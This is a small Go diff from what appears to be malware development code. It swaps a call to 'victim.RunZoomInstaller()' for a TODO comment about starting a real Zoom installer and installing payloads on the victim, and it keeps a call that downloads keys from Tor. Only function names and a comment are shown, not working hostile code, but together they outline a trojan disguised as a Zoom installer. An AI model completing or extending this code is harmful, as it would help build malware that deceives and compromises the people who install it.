@@ -7,7 +7,7 @@ import (
 )
 
 func main() {
-    go victim.RunZoomInstaller()
+    // TODO: start actual zoom installer and install payloads on victim
     err := victim.DownloadKeysFromTor()
     if err != nil {
         log.Fatal(err)
